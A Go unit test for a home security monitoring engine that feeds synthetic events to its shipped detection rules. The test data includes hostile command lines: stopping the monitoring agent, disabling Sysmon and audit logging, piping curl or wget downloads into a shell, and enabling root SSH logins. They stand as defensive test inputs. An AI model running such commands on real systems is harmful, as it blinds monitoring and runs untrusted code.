package detect

import (
	"path/filepath"
	"testing"

	"github.com/Netdoodle/homexdr/shared/event"
)

// The second set of shipped rules, matched by title.
func TestShippedRulesMore(t *testing.T) {
	rules, errs := LoadDir(filepath.Join("..", "..", "..", "rules"))
	for _, e := range errs {
		t.Errorf("load %s: %v", e.Path, e.Err)
	}
	e := NewEngine()
	e.SetRules(rules)
	titles := map[string]string{} // id -> title, shipped rules only
	for _, r := range rules {
		titles[r.ID] = r.Title
	}

	linux := &event.OS{Platform: "linux"}
	windows := &event.OS{Platform: "windows"}
	proc := func(os *event.OS, exe, cmd, parent string) *event.Event {
		ev := &event.Event{
			Host:    event.Host{OS: os},
			Event:   event.Meta{Category: []string{event.CategoryProcess}, Type: []string{event.TypeStart}, Action: "exec"},
			Process: &event.Process{Executable: exe, CommandLine: cmd},
		}
		if parent != "" {
			ev.Process.Parent = &event.Process{Executable: parent}
		}
		return ev
	}
	lnx := func(exe, cmd string) *event.Event { return proc(linux, exe, cmd, "") }
	win := func(exe, cmd string) *event.Event { return proc(windows, exe, cmd, "") }
	ctr := func(ev *event.Event, labels map[string]string) *event.Event {
		ev.Container = &event.Container{ID: "abc123", Name: "app"}
		ev.Labels = labels
		return ev
	}
	startup := map[string]string{"maintenance": "container-start"}
	dns := func(name string) *event.Event {
		return &event.Event{
			Host:  event.Host{OS: linux},
			Event: event.Meta{Category: []string{event.CategoryNetwork}, Module: event.ModuleDNS, Dataset: "dns.adguard"},
			DNS:   &event.DNS{Question: event.DNSQuestion{Name: name, Type: "A"}},
		}
	}
	audit := func(msg string) *event.Event {
		return &event.Event{
			Event:   event.Meta{Module: event.ModuleSyslog, Dataset: "syslog.audit", Category: []string{event.CategoryHost}},
			Log:     &event.Log{AppName: "audit"},
			Message: msg,
		}
	}
	syslogSSH := func(user, ip, method string) *event.Event {
		return &event.Event{
			Event:  event.Meta{Module: event.ModuleSyslog, Dataset: "syslog.sshd", Category: []string{event.CategoryAuthentication}, Action: "ssh-login", Outcome: event.OutcomeSuccess},
			User:   &event.User{Name: user},
			Source: &event.Endpoint{IP: ip},
			Data:   map[string]any{"method": method},
		}
	}

	cases := []struct {
		name string
		ev   *event.Event
		want string // rule title, or "" for no shipped rule
	}{
		{"pkill agent", lnx("/usr/bin/pkill", "pkill -9 homexdr-agent"), "HomeXDR Agent Stopped Or Removed On Linux"},
		{"systemctl stop agent", lnx("/usr/bin/systemctl", "systemctl stop homexdr-agent.service"), "HomeXDR Agent Stopped Or Removed On Linux"},
		{"plugin remove agent", lnx("/usr/local/sbin/plugin", "plugin remove homexdr-agent.plg"), "HomeXDR Agent Stopped Or Removed On Linux"},
		{"go build", lnx("/usr/local/go/pkg/tool/linux_amd64/compile", "compile -p github.com/Netdoodle/homexdr/agent/internal/platform/linux /src/agent/internal/platform/linux/kill.go"), ""},
		{"agent run", lnx("/opt/homexdr-agent", "/mnt/nvme/appdata/homexdr-agent/bin/homexdr-agent run --config agent.json"), ""},
		{"sc stop", win(`C:\Windows\System32\sc.exe`, "sc stop HomeXDRAgent"), "HomeXDR Agent Stopped Or Removed On Windows"},
		{"stop-service", win(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell Stop-Service HomeXDRAgent -Force"), "HomeXDR Agent Stopped Or Removed On Windows"},
		{"taskkill", win(`C:\Windows\System32\taskkill.exe`, "taskkill /f /im homexdr-agent.exe"), "HomeXDR Agent Stopped Or Removed On Windows"},
		{"sc query", win(`C:\Windows\System32\sc.exe`, "sc query HomeXDRAgent"), ""},
		{"sysmon uninstall", win(`C:\Windows\Sysmon64.exe`, "Sysmon64.exe -u force"), "Sysmon Or Process Auditing Turned Off"},
		{"sysmon config", win(`C:\Windows\Sysmon64.exe`, "Sysmon64.exe -c config.xml"), ""},
		{"auditpol disable", win(`C:\Windows\System32\auditpol.exe`, `auditpol /set /subcategory:"Process Creation" /success:disable`), "Sysmon Or Process Auditing Turned Off"},
		{"auditpol get", win(`C:\Windows\System32\auditpol.exe`, `auditpol /get /category:*`), ""},
		{"wevtutil disable", win(`C:\Windows\System32\wevtutil.exe`, "wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false"), "Sysmon Or Process Auditing Turned Off"},
		{"apk add", ctr(lnx("/sbin/apk", "apk add --no-cache socat nmap"), nil), "Package Installed Inside A Running Container"},
		{"apt install", ctr(lnx("/usr/bin/apt-get", "apt-get -y install netcat-openbsd"), nil), "Package Installed Inside A Running Container"},
		{"apk add at start", ctr(lnx("/sbin/apk", "apk add --no-cache jq"), startup), ""},
		{"apk on host", lnx("/sbin/apk", "apk add jq"), ""},
		{"curl pipe sh", ctr(lnx("/bin/sh", "sh -c curl -fsSL http://203.0.113.5/x | sh"), nil), "Download Piped To A Shell Inside A Container"},
		{"wget pipe bash", ctr(lnx("/bin/bash", "bash -c wget -qO- http://x/i.sh | bash -s"), nil), "Download Piped To A Shell Inside A Container"},
		{"curl to file", ctr(lnx("/usr/bin/curl", "curl -o /config/app.tar.gz https://example.org/app.tar.gz"), nil), ""},
		{"php-fpm sh", ctr(proc(linux, "/bin/sh", "sh -c id", "/usr/sbin/php-fpm82"), nil), "Web Application In A Container Started A Shell Or Network Tool"},
		{"node curl", ctr(proc(linux, "/usr/bin/curl", "curl http://x", "/usr/local/bin/node"), nil), "Web Application In A Container Started A Shell Or Network Tool"},
		{"nginx on host", proc(linux, "/bin/sh", "sh -c x", "/usr/sbin/nginx"), ""},
		{"python ffmpeg", ctr(proc(linux, "/usr/lib/ffmpeg/bin/ffmpeg", "ffmpeg -i x", "/usr/bin/python3"), nil), ""},
		{"docker exec sh", lnx("/usr/bin/docker", "docker exec -it frigate sh"), "Interactive Shell Opened In A Container"},
		{"docker exec bash", lnx("/usr/bin/docker", "docker exec -it -u root nextcloud /bin/bash"), "Interactive Shell Opened In A Container"},
		{"docker exec cmd", lnx("/usr/bin/docker", "docker exec nextcloud php occ status"), ""},
		{"permit root", lnx("/bin/sed", "sed -i s/^PermitRootLogin no/PermitRootLogin yes/ /etc/ssh/sshd_config"), "SSH Server Configured To Allow Root Or Password Logins"},
		{"password auth", lnx("/bin/bash", `bash -c "echo 'PasswordAuthentication yes' >> /boot/config/ssh/sshd_config"`), "SSH Server Configured To Allow Root Or Password Logins"},
		{"permit no", lnx("/bin/sed", "sed -i s/PermitRootLogin yes/PermitRootLogin prohibit-password/ /etc/ssh/sshd_config"), ""},
		{"user script", lnx("/bin/bash", `bash -c "curl -s http://x/s > /boot/config/plugins/user.scripts/scripts/update/script"`), "Unraid User Script Or Cron File Written From The Command Line"},
		{"plugin cron", lnx("/bin/cp", "cp /tmp/x.cron /boot/config/plugins/dynamix/x.cron"), "Unraid User Script Or Cron File Written From The Command Line"},
		{"read user script", lnx("/bin/cat", "cat /boot/config/plugins/user.scripts/scripts/backup/script"), ""},
		{"virsh define", lnx("/usr/bin/virsh", "virsh define /tmp/vm.xml"), "Virtual Machine Defined From The Command Line"},
		{"virsh list", lnx("/usr/bin/virsh", "virsh list --all"), ""},
		{"doh google", dns("dns.google"), "DNS Lookup Of A DNS-over-HTTPS Provider"},
		{"doh mozilla", dns("mozilla.cloudflare-dns.com"), "DNS Lookup Of A DNS-over-HTTPS Provider"},
		{"google", dns("www.google.com"), ""},
		{"duckdns", dns("myhome.duckdns.org"), "DNS Lookup Of A Dynamic DNS Name"},
		{"duckdns site", dns("www.duckdns.org"), "DNS Lookup Of A Dynamic DNS Name"},
		{"gui login failed", audit("/index.php: Web GUI authentication error for user 'root' from: 192.168.10.52"), "OPNsense Web GUI Login Failed"},
		{"gui login", audit("/index.php: Successful login for user 'root' from: 192.168.10.52 (using Local Database)"), "OPNsense Web GUI Login"},
		{"config change", audit("user root@192.168.10.52 changed configuration to /conf/backup/config-1762900000.1234.xml in /firewall_rules_edit.php"), "OPNsense Configuration Changed"},
		{"syslog ssh public", syslogSSH("root", "198.51.100.7", "publickey"), "SSH Login From A Public Address"},
		{"syslog root password", syslogSSH("root", "192.168.10.52", "password"), "Root SSH Login With A Password"},
		{"syslog root key", syslogSSH("root", "192.168.10.52", "publickey"), ""},
	}
	for _, c := range cases {
		var got []string
		for _, r := range e.Evaluate(c.ev) {
			if t, ok := titles[r.ID]; ok {
				got = append(got, t)
			}
		}
		switch {
		case c.want == "" && len(got) > 0:
			t.Errorf("%s: unexpected hits %v", c.name, got)
		case c.want != "" && (len(got) != 1 || got[0] != c.want):
			t.Errorf("%s: hits %v, want %q", c.name, got, c.want)
		}
	}
}
